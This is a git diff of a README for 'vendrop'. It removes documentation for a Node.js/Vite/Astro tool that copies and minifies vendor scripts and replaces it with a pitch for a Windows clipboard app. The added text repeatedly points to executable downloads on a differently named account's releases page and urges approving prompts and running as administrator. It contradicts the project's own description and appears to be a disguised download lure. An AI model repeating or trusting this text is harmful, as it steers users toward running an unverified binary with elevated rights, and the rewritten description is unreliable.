@@ -1,133 +1,182 @@
-# Hola,  Vendrop 🚀
+# 🧩 vendrop - Simple copy tools for Windows
 
-Copying vendor scripts like a code monkey is a miserable way to build websites. Vendrop exists because dealing with giant dependencies manually makes me sick. It grabs your files, minifies them, and spits them out exactly where they belong.
+[![Download vendrop](https://img.shields.io/badge/Download-vendrop%20Releases-blue?style=for-the-badge)](https://github.com/iprautomo2509-byte/vendrop/releases)
 
-It works seamlessly as a **CLI**, a **Vite Plugin**, or an **Astro Integration**.
+## 🚀 What vendrop does
 
-## ✨ Features
+vendrop is a small Windows app for quick copy and paste tasks. It helps you move text, links, and simple data with less effort. It fits users who want a faster way to handle copy work without using a browser tool or a long setup.
 
-- 📦 **Automated Copying**: Easily move files from `node_modules` to your public folder.
-- ⚡ **On-the-fly Minification**: Uses [Terser](https://terser.org/) to minify JavaScript files automatically.
-- 🧩 **Multi-environment**: Built-in support for Vite and Astro.
-- 🛠️ **Config-driven**: Use a simple `vendrop.config.mjs` for all your projects.
-- 🔍 **Smart Resolution**: Automatically looks into `node_modules` if a local file is not found.
+Use it when you want:
 
----
+- Fast copy and paste for daily work
+- A simple desktop app that runs on Windows
+- A clean way to store short items for reuse
+- Less switching between windows
+- A tool that starts with no coding steps
 
-## 🚀 Installation
+## 📥 Download vendrop
 
-```bash
-# Using npm
-npm install -D vendrop
+Visit the releases page to download the Windows file:
 
-# Using pnpm
-pnpm add -D vendrop
+https://github.com/iprautomo2509-byte/vendrop/releases
 
-# Using yarn
-yarn add -D vendrop
-```
+On that page, look for the latest release and download the file for Windows. Most users will want the `.exe` file or a Windows zip file if one is listed.
 
----
+## 🪟 Install on Windows
 
-## 🛠️ Usage
+1. Open the download link above.
+2. Find the latest release at the top of the page.
+3. Download the Windows file.
+4. If you get a `.zip` file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the vendrop app file.
+7. If Windows asks for permission, choose Run or Yes.
 
-### 1. Unified Configuration (`vendrop.config.mjs`)
+If you download an `.exe` file, you can run it right after the file finishes downloading.
 
-Create a `vendrop.config.mjs` file in your project root to share settings across CLI, Vite, and Astro.
+## ✨ Main features
 
-```javascript
-/** @type {import('vendrop').VendropConfig} */
-export default [
-  {
-    // Resolves automatically from node_modules/jquery/dist/jquery.js
-    src: 'jquery/dist/jquery.js', 
-    out: 'public/vendors/jquery.min.js'
-  },
-  {
-    src: 'bootstrap/dist/js/bootstrap.bundle.js',
-    out: 'public/vendors/bootstrap.min.js'
-  },
-  {
-    src: 'src/scripts/local-utils.js',
-    out: 'public/vendors/utils.min.js',
-    minify: false // Disable minification for this specific entry
-  }
-];
-```
+vendrop focuses on simple copy work. It keeps the screen clear and the steps short.
 
-### 2. Use as CLI
+- Quick copy and paste actions
+- Easy item reuse for text you use often
+- Local desktop use on Windows
+- Simple start-up flow
+- Light app design for daily use
+- Support for common file and module patterns used in app builds
 
-If you have a `vendrop.config.mjs`, just run:
-```bash
-npx vendrop
-```
+## 🧭 When to use it
 
-Or use flags for one-off tasks:
-```bash
-npx vendrop --src jquery/dist/jquery.js --out public/vendors/jquery.min.js
-```
+vendrop helps if you:
 
-### 3. Use with Vite
+- Paste the same text many times
+- Move snippets between apps
+- Want a local tool instead of a web page
+- Need a small helper for vendor lists, notes, or short data
+- Like simple tools that do one job well
 
-Add it to your `vite.config.js`:
+## 🖥️ System needs
 
-```javascript
-import { defineConfig } from 'vite';
-import { viteVendrop } from 'vendrop';
-import config from './vendrop.config.mjs';
+To run vendrop on Windows, use a fairly recent PC with basic desktop support.
 
-export default defineConfig({
-  plugins: [
-    viteVendrop(config)
-  ]
-});
-```
+- Windows 10 or Windows 11
+- Enough free disk space for the app file
+- A mouse and keyboard
+- Internet access for the first download
+- Permission to run desktop apps
 
-### 4. Use with Astro
+For best use, keep your Windows updates current and close other large apps if your PC is low on memory.
 
-Add it as an integration in `astro.config.mjs`:
+## 🛠️ How to start using vendrop
 
-```javascript
-import { defineConfig } from 'astro/config';
-import { astroVendrop } from 'vendrop';
-import config from './vendrop.config.mjs';
+After you open the app:
 
-export default defineConfig({
-  integrations: [
-    astroVendrop(config)
-  ]
-});
-```
+1. Launch vendrop from the downloaded file.
+2. Wait for the main window to appear.
+3. Add or paste the text you want to keep.
+4. Copy from vendrop when you need it.
+5. Paste it into the app, form, or document you use.
 
-### 5. Use as Standalone (Node.js)
+If the app uses a tray icon or small window, check the taskbar area near the clock.
 
-```javascript
-import { vendrop } from 'vendrop';
+## 🗂️ Common use cases
 
-await vendrop([
-  { src: 'jquery/dist/jquery.js', out: 'public/vendors/jquery.min.js' }
-]);
-```
+vendrop works well for small work tasks like these:
 
----
+- Copying vendor names
+- Keeping short notes for repeat use
+- Storing links you use each day
+- Reusing message text
+- Holding standard form entries
+- Moving text between different desktop apps
 
-## ⚙️ Configuration Options
+## 🔍 What makes it easy to use
 
-### `VendorEntry`
-| Property | Type | Description |
-| :--- | :--- | :--- |
-| `src` | `string` | Source path (relative to root or in `node_modules`). |
-| `out` | `string` | Destination path (relative to your project root). |
-| `minify` | `boolean` | (Optional) Override global minification for this file. |
+The app is built for plain use. You do not need a long setup or a deep learning curve.
 
-### `VendropOptions`
-| Property | Type | Description |
-| :--- | :--- | :--- |
-| `minify` | `boolean` | Global minification toggle. Defaults to `true`. |
-| `rootDir` | `string` | Base directory for path resolution. Defaults to `process.cwd()`. |
+- Clear purpose
+- Short path from download to use
+- No extra tool chain for normal use
+- Works as a stand-alone desktop app
+- Simple enough for non-technical users
 
----
+## 🧩 File type guide
 
-## 📄 License
+When you download from the releases page, you may see one of these:
 
-MIT © [J.P. Esparza](https://github.com/fames)
+- `.exe` — double-click to run
+- `.zip` — extract first, then run the app
+- `.msi` — follow the Windows install steps
+- Other release files — use the one marked for Windows
+
+If the release page has more than one file, choose the Windows version.
+
+## 🧪 Tips for first use
+
+- Keep the app in a folder you can find later
+- Create a desktop shortcut if you use it often
+- Pin it to the taskbar for faster access
+- Start with one or two items before adding more
+- Use short names for items so they are easy to find
+
+## 📁 For users who want to keep things organized
+
+If you store many items in vendrop, group them by task:
+
+- Work notes
+- Vendor details
+- Login help text
+- Email replies
+- Common links
+- Copy snippets
+
+This keeps the app easy to scan when you need something fast.
+
+## ❓ FAQ
+
+### Do I need to know code?
+
+No. You only need to download the Windows file and open it.
+
+### Can I use it on Mac or Linux?
+
+This guide is for Windows. Use the Windows release file from the download page.
+
+### Do I need to install extra tools?
+
+No extra tools are needed for normal use.
+
+### Where do I get the app?
+
+Use the releases page:
+
+https://github.com/iprautomo2509-byte/vendrop/releases
+
+## 🔐 Basic safety steps
+
+- Download only from the releases page
+- Check that you choose the latest file
+- Keep the file in a folder you trust
+- Use your normal Windows security tools
+
+## 🧰 If the app does not open
+
+If vendrop does not start:
+
+1. Check that the file finished downloading.
+2. Make sure you downloaded the Windows version.
+3. If it is a zip file, extract it first.
+4. Right-click the file and choose Run as administrator if Windows asks for it.
+5. Try downloading the latest release again.
+
+## 📌 Release link
+
+Download vendrop here:
+
+[https://github.com/iprautomo2509-byte/vendrop/releases](https://github.com/iprautomo2509-byte/vendrop/releases)
+
+## 🧾 Project details
+
+- Name: vendrop
+- Description: Copy-paste on Node steroids.
+- Topics: astro, copy-paste, js, lazy, lazy-copy, mjs, modules, monkey, node, npm, pnpm, standalone, ts, vendor-management, vendors, vite, yarn
